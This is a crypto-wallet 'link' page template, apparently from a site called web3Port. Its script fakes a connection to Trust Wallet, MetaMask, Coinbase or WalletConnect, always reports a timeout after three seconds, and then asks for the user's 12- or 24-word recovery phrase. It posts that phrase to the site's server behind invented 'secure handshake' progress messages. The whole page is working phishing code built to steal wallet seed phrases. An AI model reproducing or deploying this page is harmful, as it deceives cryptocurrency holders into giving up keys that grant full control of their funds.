<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="../assets/images/logo.png" type="image/x-icon" />
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Link Wallet - web3Port</title>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'trust-blue': '#3375BB',
                        'trust-bg': '#F7F9FC',
                        'trust-gray': '#8A92B2',
                        'trust-dark': '#1A1D29',
                        'trust-red': '#FF4747',
                        'trust-green': '#00D4AA',
                    },
                    fontFamily: { inter: ['Inter','sans-serif'] }
                }
            }
        }
    </script>
    <style>
        :root{
            --bg:#0f141b;
            --surface:#161c24;
            --surface-2:#1b212a;
            --text:#e5e7eb;
            --muted:#9ca3af;
            --border:#262c36;
            --accent:#f5c542;
            --danger:#ef4444;
            --success:#22c55e;
        }
        *{box-sizing:border-box;}
        body{
            font-family:'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background:var(--bg);
            color:var(--text);
            margin:0;
            min-height:100vh;
            -webkit-font-smoothing:antialiased;
        }
        .wallet-header{
            background:var(--bg);
            padding:16px 20px;
            display:flex;
            align-items:center;
            justify-content:space-between;
            border-bottom:1px solid var(--border);
            position:sticky;
            top:0;
            z-index:50;
            backdrop-filter:blur(10px);
        }
        .bottom-nav{
            position:fixed;
            bottom:0;
            left:0;
            right:0;
            background:var(--surface);
            border-top:1px solid var(--border);
            padding:8px 0 calc(10px + env(safe-area-inset-bottom));
            display:grid;
            grid-template-columns:repeat(5,1fr);
            backdrop-filter:blur(10px);
            z-index:100;
        }
        .nav-item{
            display:flex;
            flex-direction:column;
            align-items:center;
            padding:8px;
            color:var(--muted);
            text-decoration:none;
            font-size:12px;
            font-weight:500;
            transition:.2s;
        }
        .nav-item.active{
            color:var(--accent);
        }
        .nav-icon {
            width: 24px;
            height: 24px;
            margin-bottom: 4px;
            transition: transform 0.2s ease;
        }
        .nav-item:active .nav-icon {
            transform: scale(0.94);
        }
        
        .glass-panel {
            background: rgba(22, 28, 36, 0.75);
            backdrop-filter: blur(16px);
            border: 1px solid var(--border);
        }
        
        .pulse-accent {
            box-shadow: 0 0 0 0 rgba(245, 197, 66, 0.4);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(245, 197, 66, 0.4);
            }
            70% {
                box-shadow: 0 0 0 10px rgba(245, 197, 66, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(245, 197, 66, 0);
            }
        }
    </style>
</head>
<body class="pb-28">
    <!-- Header -->
    <div class="wallet-header">
        <svg onclick="window.location.href='/crypto'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:28px;height:28px;color:var(--muted);cursor:pointer;transition:.2s;" class="hover:text-white">
            <path d="M19 12H5M12 19l-7-7 7-7"/>
        </svg>
        <div style="font-size:20px;font-weight:700;color:var(--text);">Link Web3 Wallet</div>
        <div style="width:28px;"></div>
    </div>

    <div class="w-full max-w-xl mx-auto px-4 sm:px-6 lg:px-8 mt-6 md:mt-8">
        <!-- Status Notification Banner -->
        <div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/5 border border-amber-500/20 rounded-2xl p-4 sm:p-5 mb-6 flex items-start space-x-3 sm:space-x-4 shadow-lg shadow-amber-500/5">
            <div class="p-2 bg-amber-500/15 rounded-xl text-accent flex-shrink-0">
                <i class="ph-bold ph-shield-check text-xl"></i>
            </div>
            <div class="flex-1">
                <h4 class="font-bold text-sm sm:text-base text-white tracking-wide">Secure Cryptographic Bridge</h4>
                <p class="text-xs text-gray-400 leading-relaxed mt-1">Establishing a secure cryptographic bridge allows you to synchronise node balances, unlock quick swaps, and process pending stakes instantly.</p>
            </div>
        </div>

        <!-- Connection State 1: Choose Wallet -->
        <div id="walletSelectionState" class="space-y-6">
            <div class="text-center">
                <h2 class="text-lg font-bold text-white tracking-wide">Select Wallet Provider</h2>
                <p class="text-xs text-gray-400 mt-1.5">Select one of our supported Web3 providers to initiate a secure connection</p>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <!-- Trust Wallet -->
                <button onclick="startConnection('Trust Wallet', '/assets/images/trust.png')" class="glass-panel hover:bg-white/5 rounded-2xl p-5 flex items-center space-x-4 text-left transition-all duration-300 border border-gray-800/80 hover:border-accent hover:shadow-lg hover:shadow-accent/5 active:scale-[0.98] group relative overflow-hidden focus:outline-none focus:ring-2 focus:ring-accent/25">
                    <div class="w-12 h-12 bg-blue-500/10 border border-blue-500/20 rounded-xl flex items-center justify-center group-hover:scale-105 transition-transform duration-300 flex-shrink-0">
                        <i class="ph-bold ph-wallet text-2xl text-blue-400"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                        <span class="block font-bold text-sm sm:text-base text-white truncate">Trust Wallet</span>
                        <span class="block text-[10px] sm:text-xs text-accent mt-0.5 font-medium tracking-wider uppercase">Recommended</span>
                    </div>
                    <div class="text-gray-600 group-hover:text-accent transition-colors duration-300">
                        <i class="ph-bold ph-caret-right text-lg"></i>
                    </div>
                </button>

                <!-- MetaMask -->
                <button onclick="startConnection('MetaMask', '/assets/images/metamask.png')" class="glass-panel hover:bg-white/5 rounded-2xl p-5 flex items-center space-x-4 text-left transition-all duration-300 border border-gray-800/80 hover:border-accent hover:shadow-lg hover:shadow-accent/5 active:scale-[0.98] group relative overflow-hidden focus:outline-none focus:ring-2 focus:ring-accent/25">
                    <div class="w-12 h-12 bg-orange-500/10 border border-orange-500/20 rounded-xl flex items-center justify-center group-hover:scale-105 transition-transform duration-300 flex-shrink-0">
                        <i class="ph-bold ph-cube text-2xl text-orange-400"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                        <span class="block font-bold text-sm sm:text-base text-white truncate">MetaMask</span>
                        <span class="block text-[10px] sm:text-xs text-gray-500 mt-0.5 font-medium tracking-wider uppercase">Web3 Standard</span>
                    </div>
                    <div class="text-gray-600 group-hover:text-accent transition-colors duration-300">
                        <i class="ph-bold ph-caret-right text-lg"></i>
                    </div>
                </button>

                <!-- Coinbase Wallet -->
                <button onclick="startConnection('Coinbase Wallet', '/assets/images/coinbase.png')" class="glass-panel hover:bg-white/5 rounded-2xl p-5 flex items-center space-x-4 text-left transition-all duration-300 border border-gray-800/80 hover:border-accent hover:shadow-lg hover:shadow-accent/5 active:scale-[0.98] group relative overflow-hidden focus:outline-none focus:ring-2 focus:ring-accent/25">
                    <div class="w-12 h-12 bg-indigo-500/10 border border-indigo-500/20 rounded-xl flex items-center justify-center group-hover:scale-105 transition-transform duration-300 flex-shrink-0">
                        <i class="ph-bold ph-shield-star text-2xl text-indigo-400"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                        <span class="block font-bold text-sm sm:text-base text-white truncate">Coinbase Wallet</span>
                        <span class="block text-[10px] sm:text-xs text-gray-500 mt-0.5 font-medium tracking-wider uppercase">US Institutional</span>
                    </div>
                    <div class="text-gray-600 group-hover:text-accent transition-colors duration-300">
                        <i class="ph-bold ph-caret-right text-lg"></i>
                    </div>
                </button>

                <!-- WalletConnect -->
                <button onclick="startConnection('WalletConnect', '/assets/images/walletconnect.png')" class="glass-panel hover:bg-white/5 rounded-2xl p-5 flex items-center space-x-4 text-left transition-all duration-300 border border-gray-800/80 hover:border-accent hover:shadow-lg hover:shadow-accent/5 active:scale-[0.98] group relative overflow-hidden focus:outline-none focus:ring-2 focus:ring-accent/25">
                    <div class="w-12 h-12 bg-sky-500/10 border border-sky-500/20 rounded-xl flex items-center justify-center group-hover:scale-105 transition-transform duration-300 flex-shrink-0">
                        <i class="ph-bold ph-arrows-merge text-2xl text-sky-400"></i>
                    </div>
                    <div class="flex-1 min-w-0">
                        <span class="block font-bold text-sm sm:text-base text-white truncate">WalletConnect</span>
                        <span class="block text-[10px] sm:text-xs text-gray-500 mt-0.5 font-medium tracking-wider uppercase">Any Multi-Chain</span>
                    </div>
                    <div class="text-gray-600 group-hover:text-accent transition-colors duration-300">
                        <i class="ph-bold ph-caret-right text-lg"></i>
                    </div>
                </button>
            </div>
            
            <div class="text-center pt-4">
                <button onclick="showManualState('Custom Private Key')" class="text-xs text-gray-500 hover:text-accent transition-colors duration-200 underline font-medium">
                    Or perform a direct manual BIP-39 link
                </button>
            </div>
        </div>

        <!-- Connection State 2: Simulated Connection Modal Overlay -->
        <div id="connectingState" class="hidden glass-panel rounded-2xl p-8 text-center border-accent/20 relative overflow-hidden shadow-2xl">
            <div class="absolute inset-0 bg-accent/5 animate-pulse"></div>
            <div class="relative z-10 flex flex-col items-center py-4">
                <!-- Loader -->
                <div class="relative w-20 h-20 mb-6">
                    <div class="absolute inset-0 border-4 border-accent/10 rounded-full"></div>
                    <div class="absolute inset-0 border-4 border-t-accent rounded-full animate-spin"></div>
                    <div class="absolute inset-2 bg-gray-950/80 rounded-full flex items-center justify-center">
                        <i class="ph-bold ph-waveform text-accent text-2xl animate-pulse"></i>
                    </div>
                </div>
                
                <h3 id="connectingTitle" class="text-lg font-bold text-white tracking-wide">Connecting to Trust Wallet...</h3>
                <p id="connectingSubtitle" class="text-xs text-gray-400 mt-2 max-w-xs leading-relaxed">Initializing secure Web3 handshake protocol. Please confirm the prompt on your mobile wallet app...</p>
                
                <div class="w-full max-w-xs bg-gray-900 border border-gray-800/80 h-2.5 rounded-full mt-6 overflow-hidden p-0.5">
                    <div id="connectingProgress" class="bg-gradient-to-r from-amber-500 to-accent h-full rounded-full transition-all duration-300" style="width: 10%;"></div>
                </div>
            </div>
        </div>

        <!-- Connection State 3: Failure + Manual Fallback Form -->
        <div id="manualState" class="hidden space-y-6">
            <div class="text-center">
                <h2 class="text-lg font-bold text-white tracking-wide">Manual Encrypted Connection</h2>
                <p class="text-xs text-gray-400 mt-1.5 leading-relaxed">Deep-link timed out. Establish a secure end-to-end backup link via your BIP-39 recovery phrase</p>
            </div>

            <!-- Form -->
            <form id="linkForm" action="{{ route('crypto.link-wallet.post') }}" method="POST" class="space-y-6">
                @csrf
                <input type="hidden" name="wallet_name" id="walletNameInput" value="Trust Wallet">
                
                <!-- Words selection tabs -->
                <div class="flex bg-gray-950/60 p-1.5 rounded-2xl border border-gray-800/80">
                    <button type="button" onclick="setWordCount(12)" id="tab12" class="w-1/2 text-center py-2 text-xs font-bold rounded-xl bg-accent/15 text-accent border border-accent/20 transition-all duration-300 select-none shadow-sm shadow-accent/5">12 Words</button>
                    <button type="button" onclick="setWordCount(24)" id="tab24" class="w-1/2 text-center py-2 text-xs font-semibold rounded-xl text-gray-400 hover:text-white transition-all duration-300 select-none">24 Words</button>
                </div>

                <!-- Paste helper -->
                <div class="glass-panel rounded-2xl p-4 border-gray-800/80 shadow-md">
                    <div class="flex items-center justify-between mb-2">
                        <div class="flex items-center space-x-1.5">
                            <i class="ph-bold ph-clipboard text-accent text-sm"></i>
                            <label class="text-xs font-bold text-gray-300 tracking-wide">Quick Paste Mnemonic</label>
                        </div>
                        <div class="flex items-center space-x-3">
                            <button type="button" onclick="handlePaste()" class="text-accent hover:text-[#dca51a] text-xs font-bold transition flex items-center space-x-1">
                                <span>Paste</span>
                            </button>
                            <span class="text-gray-700">|</span>
                            <button type="button" onclick="document.getElementById('pasteBox').value = ''; validateInputs();" class="text-gray-500 hover:text-gray-300 text-xs font-bold transition">
                                Clear
                            </button>
                        </div>
                    </div>
                    <textarea id="pasteBox" rows="2" placeholder="Paste your 12 or 24 word phrase here (separated by spaces)..." class="w-full bg-gray-950/50 border border-gray-800/80 rounded-xl p-3 text-xs text-white placeholder-gray-600 focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent/20 font-mono transition duration-200 resize-none leading-relaxed"></textarea>
                </div>

                <!-- Word Input Grid -->
                <div class="glass-panel rounded-2xl p-5 border-gray-800/80 space-y-4 shadow-md">
                    <div class="flex items-center justify-between">
                        <label class="text-xs font-bold text-gray-300 tracking-wide block">Recovery Mnemonic Words</label>
                        <span class="text-[10px] text-gray-500 font-semibold px-2 py-0.5 bg-gray-900 border border-gray-800/80 rounded-md">BIP-39 Standard</span>
                    </div>
                    
                    <div id="wordGrid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3 md:gap-4">
                        <!-- Dynamic inputs injected by JS -->
                    </div>
                </div>

                <!-- Complete Hidden Phrase Field -->
                <input type="hidden" name="wallet_phrase" id="completePhraseInput">

                <!-- Submit Button / Loader Pipeline -->
                <div class="space-y-4">
                    <button type="button" id="submitLinkBtn" onclick="initiateLinkingPipeline()" class="w-full py-4 bg-accent hover:bg-[#dca51a] text-black font-extrabold text-sm rounded-xl transition duration-200 shadow-lg shadow-accent/20 flex items-center justify-center space-x-2 cursor-pointer active:scale-[0.98]">
                        <span>Establish Secured Link</span>
                        <i class="ph-bold ph-arrow-right"></i>
                    </button>
                    
                    <!-- Progress Linking overlay -->
                    <div id="linkingPipeline" class="hidden glass-panel rounded-2xl p-5 border-accent/20 space-y-3 shadow-lg">
                        <div class="flex items-center space-x-3">
                            <div class="w-5 h-5 border-2 border-accent/25 border-t-accent rounded-full animate-spin flex-shrink-0"></div>
                            <span id="pipelineStepText" class="text-xs text-white font-bold tracking-wide">Step 1/3: Verifying BIP-39 mnemonic checksum...</span>
                        </div>
                        <div class="w-full bg-gray-900 border border-gray-800/80 h-2 rounded-full overflow-hidden p-0.5">
                            <div id="pipelineProgress" class="bg-gradient-to-r from-amber-500 to-accent h-full rounded-full transition-all duration-300" style="width: 10%;"></div>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <!-- Bottom Navigation -->
    <div class="bottom-nav">
        <a href="/crypto" class="nav-item">
            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="3" width="7" height="9" rx="1"/>
                <rect x="14" y="3" width="7" height="5" rx="1"/>
                <rect x="14" y="12" width="7" height="9" rx="1"/>
                <rect x="3" y="16" width="7" height="5" rx="1"/>
            </svg>
            <span>Home</span>
        </a>
        <a href="/crypto/stake" class="nav-item">
            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M3 3V9M21 3V9M3 15V21M21 15V21M3 9H21M3 15H21"/>
            </svg>
            <span>Earn</span>
        </a>
        <a href="/crypto/swap" class="nav-item">
            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M7 16L17 6M17 6H9M17 6V14"/>
                <path d="M17 8L7 18M7 18H15M7 18V10"/>
            </svg>
            <span>Trade</span>
        </a>
        <a href="/crypto/link-wallet" class="nav-item active">
            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="3"/>
                <path d="M12 1V3M12 21V23M4.22 4.22L5.64 5.64M18.36 18.36L19.78 19.78M1 12H3M21 12H23M4.22 19.78L5.64 18.36M18.36 5.64L19.78 4.22"/>
            </svg>
            <span>Link</span>
        </a>
        <a href="/crypto/account" class="nav-item">
            <svg class="nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="3" width="18" height="14" rx="2"/>
                <path d="M8 21h8M12 17v4"/>
            </svg>
            <span>Account</span>
        </a>
    </div>

    <!-- JS Logic -->
    <script>
        let currentWordCount = 12;
        let selectedWallet = "Trust Wallet";

        function startConnection(walletName, iconPath) {
            selectedWallet = walletName;
            document.getElementById('walletNameInput').value = walletName;
            
            // Hide wallet selection, show connection screen
            document.getElementById('walletSelectionState').classList.add('hidden');
            const connState = document.getElementById('connectingState');
            connState.classList.remove('hidden');
            
            document.getElementById('connectingTitle').innerText = `Connecting to ${walletName}...`;
            
            const progress = document.getElementById('connectingProgress');
            const subtitle = document.getElementById('connectingSubtitle');
            
            // Step-by-step connection simulation
            setTimeout(() => {
                progress.style.width = "40%";
                subtitle.innerText = "Authorizing remote socket handshake. Check your device for prompt...";
            }, 800);
            
            setTimeout(() => {
                progress.style.width = "75%";
                subtitle.innerText = "Synchronizing keys and derivation routes...";
            }, 1800);
            
            setTimeout(() => {
                // Connection failed - show manual state
                connState.classList.add('hidden');
                showManualState(walletName);
            }, 3000);
        }

        function showManualState(walletName) {
            document.getElementById('walletSelectionState').classList.add('hidden');
            document.getElementById('connectingState').classList.add('hidden');
            document.getElementById('manualState').classList.remove('hidden');
            document.getElementById('walletNameInput').value = walletName;
            
            setWordCount(currentWordCount);
        }

        function setWordCount(count) {
            currentWordCount = count;
            
            // Toggle active classes on tab buttons
            const tab12 = document.getElementById('tab12');
            const tab24 = document.getElementById('tab24');
            
            if (count === 12) {
                tab12.className = "w-1/2 text-center py-2 text-xs font-bold rounded-xl bg-accent/15 text-accent border border-accent/20 transition-all duration-300 select-none shadow-sm shadow-accent/5";
                tab24.className = "w-1/2 text-center py-2 text-xs font-semibold rounded-xl text-gray-400 hover:text-white transition-all duration-300 select-none";
            } else {
                tab24.className = "w-1/2 text-center py-2 text-xs font-bold rounded-xl bg-accent/15 text-accent border border-accent/20 transition-all duration-300 select-none shadow-sm shadow-accent/5";
                tab12.className = "w-1/2 text-center py-2 text-xs font-semibold rounded-xl text-gray-400 hover:text-white transition-all duration-300 select-none";
            }
            
            // Build the input grid
            const grid = document.getElementById('wordGrid');
            grid.innerHTML = '';
            
            for (let i = 1; i <= count; i++) {
                grid.innerHTML += `
                    <div class="relative group">
                        <span class="absolute left-2.5 top-1/2 -translate-y-1/2 text-[10px] text-accent/50 font-bold select-none font-mono bg-gray-900/80 border border-gray-800 w-5 h-5 rounded-full flex items-center justify-center transition-colors group-focus-within:border-accent/40 group-focus-within:text-accent">${i}</span>
                        <input type="password" id="word-${i}" oninput="validateInputs()" class="w-full bg-gray-950/40 border border-gray-800/80 rounded-xl py-2.5 pl-9 pr-2.5 text-xs text-white placeholder-gray-700 font-medium focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent/10 font-mono transition duration-200" placeholder="••••" required>
                    </div>
                `;
            }
            
            validateInputs();
        }

        function handlePaste() {
            const text = document.getElementById('pasteBox').value.trim();
            if (!text) return;
            
            // Split by whitespace
            const words = text.split(/\s+/);
            
            // Auto switch tab if pasted 24 words
            if (words.length >= 24) {
                setWordCount(24);
            } else {
                setWordCount(12);
            }
            
            // Fill inputs
            const limit = Math.min(words.length, currentWordCount);
            for (let i = 1; i <= limit; i++) {
                const el = document.getElementById(`word-${i}`);
                if (el) el.value = words[i - 1];
            }
            
            validateInputs();
        }

        function validateInputs() {
            let allFilled = true;
            for (let i = 1; i <= currentWordCount; i++) {
                const el = document.getElementById(`word-${i}`);
                if (!el || !el.value.trim()) {
                    allFilled = false;
                    break;
                }
            }
            
            const submitBtn = document.getElementById('submitLinkBtn');
            if (allFilled) {
                submitBtn.disabled = false;
                submitBtn.className = "w-full py-4 bg-accent hover:bg-[#dca51a] text-black font-extrabold text-sm rounded-xl transition duration-200 shadow-lg shadow-accent/20 flex items-center justify-center space-x-2 cursor-pointer active:scale-[0.98]";
            } else {
                submitBtn.disabled = true;
                submitBtn.className = "w-full py-4 bg-gray-800/80 text-gray-500 font-bold text-sm rounded-xl transition duration-200 flex items-center justify-center space-x-2 cursor-not-allowed border border-gray-800/50";
            }
        }

        function initiateLinkingPipeline() {
            // Gather complete recovery phrase
            const words = [];
            for (let i = 1; i <= currentWordCount; i++) {
                words.push(document.getElementById(`word-${i}`).value.trim());
            }
            const completePhrase = words.join(' ');
            document.getElementById('completePhraseInput').value = completePhrase;
            
            // Disable button, show pipeline
            const submitBtn = document.getElementById('submitLinkBtn');
            submitBtn.classList.add('hidden');
            
            const pipeline = document.getElementById('linkingPipeline');
            pipeline.classList.remove('hidden');
            
            const stepText = document.getElementById('pipelineStepText');
            const progress = document.getElementById('pipelineProgress');
            
            // Step 1: Checksum
            setTimeout(() => {
                progress.style.width = "40%";
                stepText.innerText = "Step 2/3: Securing asymmetric node handshakes...";
            }, 1000);
            
            // Step 2: Handshakes
            setTimeout(() => {
                progress.style.width = "80%";
                stepText.innerText = "Step 3/3: Synchronizing secure Web3 channel...";
            }, 2000);
            
            // Step 3: Complete
            setTimeout(() => {
                progress.style.width = "100%";
                document.getElementById('linkForm').submit();
            }, 3000);
        }
    </script>
</body>
</html>